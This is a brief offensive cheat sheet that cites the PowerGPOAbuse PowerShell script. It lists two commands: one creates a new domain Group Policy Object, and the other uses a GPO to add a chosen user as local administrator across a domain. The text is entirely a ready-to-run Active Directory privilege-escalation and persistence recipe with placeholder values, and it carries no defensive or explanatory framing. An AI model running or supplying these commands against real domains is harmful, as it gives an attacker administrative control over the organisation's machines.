### Source
https://raw.githubusercontent.com/rootSySdk/PowerGPOAbuse/master/PowerGPOAbuse.ps1  

### Create new gpo
```
New-DomainGPO -DisplayName <gpoName> -Domain <domain>
```

### Use gpo to add new admin
```
Add-LocalAdmin -GPOIdentity '<gpo>' -Member <user> -Domain <domain>
```

